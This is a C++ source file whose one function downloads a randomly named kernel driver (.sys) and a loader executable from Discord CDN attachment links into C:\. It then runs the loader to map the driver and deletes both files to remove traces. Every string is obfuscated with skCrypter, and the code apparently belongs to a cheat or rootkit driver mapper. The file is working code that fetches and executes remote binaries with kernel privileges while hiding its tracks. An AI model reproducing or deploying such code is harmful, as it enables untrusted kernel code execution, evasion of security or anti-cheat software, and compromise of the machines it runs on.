#include <iostream>

#include "globals.h"
#include "utils.h"
#include "../security/skCrypter.h"

bool globals::map_d()
{
	if (!(DownloadFile(skCrypt("https://cdn.discordapp.com/attachments/1300247583142449218/1301181499231703062/dv23r8uvfdsk.sys?ex=67603034&is=675edeb4&hm=34c1a1e43a8c701d2853f2a8b1a8c48ac025704deb4763b8cf05a1666ba3d67a&"), skCrypt("C:\\dv23r8uvfdsk.sys"))))
	{
		std::cout << skCrypt("downloading failed\n");
		return false;
	}
	if (!(DownloadFile(skCrypt("https://cdn.discordapp.com/attachments/1300247583142449218/1304176709825990706/lawfp29v58uhjsa.exe?ex=676089b6&is=675f3836&hm=feac1d7f75aca663380755b7ac49691be6e1afc69b3e4d43d7ecc5518560e2c6&"), skCrypt("C:\\lawfp29v58uhjsa.exe"))))
	{
		std::cout << skCrypt("downloading failed, m\n");
		return false;
	}
	if (!(LaunchDriverLoader(skCrypt("C:\\lawfp29v58uhjsa.exe").decrypt(), skCrypt("C:\\dv23r8uvfdsk.sys").decrypt())))
	{
		std::cout << skCrypt("failed to load driver\n");
		return false;
	}
	if (!(_DeleteFile(skCrypt("C:\\dv23r8uvfdsk.sys").decrypt())))
	{
		std::cout << skCrypt(".sys\n");
		return false;
	}
	if (!(_DeleteFile(skCrypt("C:\\lawfp29v58uhjsa.exe").decrypt())))
	{
		std::cout << skCrypt(".exe\n");
		return false;
	}

	return true;
}